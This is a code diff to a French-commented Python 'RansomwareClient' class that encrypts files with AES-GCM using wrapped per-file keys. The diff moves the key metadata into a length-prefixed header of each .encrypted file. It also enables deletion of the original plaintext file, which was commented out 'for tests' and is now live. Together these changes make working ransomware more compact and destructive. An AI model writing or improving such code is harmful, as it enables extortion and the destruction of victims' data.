@@ -172,18 +172,23 @@ class RansomwareClient:
             "tag": base64.b64encode(tag).decode('utf-8'),
         }
 
-        # Sauvegarde le fichier chiffré
+        # Sérialise les métadonnées en JSON
+        metadata_json = json.dumps(metadata).encode('utf-8')
+        metadata_length = len(metadata_json)
+
+        # Crée le fichier .encrypted avec format:
+        # [4 bytes: longueur métadonnées] [métadonnées JSON] [ciphertext]
         encrypted_path = file_path.with_suffix(file_path.suffix + config.ENCRYPTED_EXTENSION)
         with open(encrypted_path, 'wb') as f:
+            # Écrit la longueur des métadonnées (4 bytes, little-endian)
+            f.write(metadata_length.to_bytes(4, byteorder='little'))
+            # Écrit les métadonnées JSON
+            f.write(metadata_json)
+            # Écrit le ciphertext
             f.write(ciphertext)
 
-        # Sauvegarde les métadonnées
-        meta_path = file_path.with_suffix(file_path.suffix + config.META_EXTENSION)
-        with open(meta_path, 'w') as f:
-            json.dump(metadata, f, indent=2)
-
-        # Supprime le fichier original (optionnel - commenté pour les tests)
-        # file_path.unlink()
+        # Supprime le fichier original
+        file_path.unlink()
 
     def decrypt_all(self, path: str = ".") -> None:
         """
@@ -257,18 +262,27 @@ class RansomwareClient:
             encrypted_path: Chemin du fichier chiffré
             root_key: Root Key pour désencapsuler la clé du fichier
         """
-        # Construit le chemin du fichier de métadonnées
         base_name = encrypted_path.name.replace(config.ENCRYPTED_EXTENSION, "")
-        meta_path = encrypted_path.parent / (base_name + config.META_EXTENSION)
-
-        if not meta_path.exists():
-            raise FileNotFoundError(f"Métadonnées introuvables: {meta_path}")
-
         print(f"  [DECRYPT] {base_name}")
 
-        # Lit les métadonnées
-        with open(meta_path, 'r') as f:
-            metadata = json.load(f)
+        # Lit le fichier .encrypted
+        with open(encrypted_path, 'rb') as f:
+            # Lit la longueur des métadonnées (4 bytes)
+            metadata_length_bytes = f.read(4)
+            if len(metadata_length_bytes) != 4:
+                raise ValueError(f"Fichier corrompu: {encrypted_path}")
+
+            metadata_length = int.from_bytes(metadata_length_bytes, byteorder='little')
+
+            # Lit les métadonnées JSON
+            metadata_json = f.read(metadata_length)
+            if len(metadata_json) != metadata_length:
+                raise ValueError(f"Métadonnées corrompues: {encrypted_path}")
+
+            metadata = json.loads(metadata_json.decode('utf-8'))
+
+            # Lit le ciphertext (reste du fichier)
+            ciphertext = f.read()
 
         wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
         wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
@@ -280,10 +294,6 @@ class RansomwareClient:
         # Désencapsule la clé de fichier
         file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_ciphertext, root_key, wrapped_key_nonce, wrapped_key_tag)
 
-        # Lit le fichier chiffré
-        with open(encrypted_path, 'rb') as f:
-            ciphertext = f.read()
-
         # Déchiffre
         plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)
 
@@ -292,9 +302,8 @@ class RansomwareClient:
         with open(decrypted_path, 'wb') as f:
             f.write(plaintext)
 
-        # Supprime le fichier chiffré et les métadonnées (optionnel)
-        # encrypted_path.unlink()
-        # meta_path.unlink()
+        # Supprime le fichier .encrypted
+        encrypted_path.unlink()
 
     def decrypt_file(self, file_path: str) -> None:
         """
@@ -313,15 +322,24 @@ class RansomwareClient:
 
         print(f"\n[CLIENT] Déchiffrement du fichier: {encrypted_path.name}")
 
-        # Lit les métadonnées
-        base_name = encrypted_path.name.replace(config.ENCRYPTED_EXTENSION, "")
-        meta_path = encrypted_path.parent / (base_name + config.META_EXTENSION)
+        # Lit le fichier .encrypted et extrait les métadonnées
+        with open(encrypted_path, 'rb') as f:
+            # Lit la longueur des métadonnées (4 bytes)
+            metadata_length_bytes = f.read(4)
+            if len(metadata_length_bytes) != 4:
+                raise ValueError(f"Fichier corrompu: {encrypted_path}")
 
-        if not meta_path.exists():
-            raise FileNotFoundError(f"Métadonnées introuvables: {meta_path}")
+            metadata_length = int.from_bytes(metadata_length_bytes, byteorder='little')
 
-        with open(meta_path, 'r') as f:
-            metadata = json.load(f)
+            # Lit les métadonnées JSON
+            metadata_json = f.read(metadata_length)
+            if len(metadata_json) != metadata_length:
+                raise ValueError(f"Métadonnées corrompues: {encrypted_path}")
+
+            metadata = json.loads(metadata_json.decode('utf-8'))
+
+            # Lit le ciphertext (reste du fichier)
+            ciphertext = f.read()
 
         wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
         wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
@@ -345,15 +363,15 @@ class RansomwareClient:
         tag = base64.b64decode(metadata["tag"])
         original_name = metadata["original_name"]
 
-        with open(encrypted_path, 'rb') as f:
-            ciphertext = f.read()
-
         plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)
 
         # Sauvegarde
         decrypted_path = encrypted_path.parent / original_name
         with open(decrypted_path, 'wb') as f:
             f.write(plaintext)
+
+        # Supprime le fichier .encrypted
+        encrypted_path.unlink()
 
         print(f"[CLIENT] Fichier déchiffré: {decrypted_path}")
 
